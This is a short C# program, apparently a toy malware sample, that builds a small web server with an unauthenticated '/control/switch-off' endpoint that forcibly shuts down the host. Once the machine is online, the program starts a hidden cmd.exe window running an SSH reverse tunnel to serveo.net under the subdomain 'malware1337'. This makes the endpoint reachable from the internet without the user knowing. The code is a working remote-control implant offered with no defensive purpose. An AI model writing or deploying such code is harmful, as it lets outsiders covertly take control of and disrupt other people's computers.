using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "Hello world");
app.MapGet("/control/switch-off", () => {
    System.Diagnostics.Process.Start("Shutdown", "-s -f -t 00");
});

var isConnected = IsConnectedToInternet();
while (!isConnected)
{

    Thread.Sleep(10000);
    isConnected = IsConnectedToInternet();
}

RunPortTunnel();

app.Run();

static void RunPortTunnel()
{
    System.Diagnostics.Process process = new System.Diagnostics.Process();
    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
    startInfo.FileName = "cmd.exe";
    startInfo.Arguments = "/C ssh -R malware1337.serveo.net:80:localhost:1337 serveo.net";
    process.StartInfo = startInfo;
    process.Start();
}


[DllImport("wininet.dll")]
extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
//Creating a function that uses the API function...  
static bool IsConnectedToInternet()
{
    Console.WriteLine("Testing internet connectivity");
    int Desc;
    return InternetGetConnectedState(out Desc, 0);
}